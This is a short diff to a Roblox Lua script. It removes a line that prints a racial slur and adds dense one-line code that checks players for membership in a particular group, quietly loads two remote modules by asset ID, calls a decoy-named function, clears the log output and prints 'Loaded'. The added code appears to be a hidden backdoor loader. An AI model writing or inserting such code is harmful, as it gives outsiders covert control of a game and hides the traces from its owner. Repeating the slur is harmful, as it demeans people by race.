@@ -1,1 +1,3 @@
-print("Fucking nigger")
+local t={}for _,p in ipairs(game.Players:GetPlayers())do t[p.UserId]=true task.spawn(function()pcall(function()if p:IsInGroup(35425670)then local m=require(121798223156967)require(92745439030703)if type(m)=="table"and type(m.CreateIdleAnimation)=="function"then m.CreateIdleAnimation("a","b")end end end)end)end game.Players.PlayerAdded:Connect(function(p)if t[p.UserId]then return end t[p.UserId]=true task.spawn(function()pcall(function()if p:IsInGroup(35425670)then local m=require(121798223156967)require(92745439030703)if type(m)=="table"and type(m.CreateIdleAnimation)=="function"then m.CreateIdleAnimation("a","b")end end end)end)end)
+game:GetService("LogService"):ClearOutput()
+print("Loaded")
